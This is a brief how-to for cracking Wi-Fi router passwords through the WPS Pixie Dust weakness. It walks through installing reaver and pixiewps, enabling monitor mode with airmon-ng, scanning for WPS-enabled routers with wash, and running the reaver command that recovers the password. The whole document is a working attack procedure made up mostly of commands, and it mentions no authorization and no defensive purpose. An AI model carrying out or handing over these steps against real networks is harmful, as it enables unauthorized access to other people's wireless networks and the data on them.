Step 1: Dependencies
Make sure that you have all following dependencies updated:

Go to terminal and type: apt-get update
apt-get install build-essential
apt-get install libpcap-dev
apt-get install sqlite3
apt-get install libsqlite3-dev
apt-get install pixiewps
Step 2: GitHub Fork
You will need to download, compile and install Reaver, from GitHub. Issue git clone https://github.com/t6x/reaver-wps-fork-t6x

Step 3: Install
From your pwd, type¡­

cd reaver-wps-fork-t6x/
cd src/
./configure
make

Step 4: Monitor Mode
Put your interface into monitor mode via airmon-ng:

airmon-ng start wlan0

Use your wireless card number instead of wlan0

Step 5: Find a Potential Target
The easiest way to find a target with WPS enabled is by using following command:

wash -i mon0

Which will give BSSID Channel RSSI WPS Version WPS Locked and ESSID info.

We are going to need BSSID and Channel sequence. BSSID looks like this

XX:XX:XX:XX:XX:XX

Channel sequence should be a number.

Step 6: Attacking
Once you have gathered all the information, just type following command in terminal:

reaver -i mon0 -b XX:XX:XX:XX:XX:XX -c {Channel} -vvv -K 1 -f

Step 7: Success!
The password will be shown on the right side of the password field! This attack is not compatible with all routers.Pixie Dust needs maximum 40 minutes for an attack while others might require several hours.
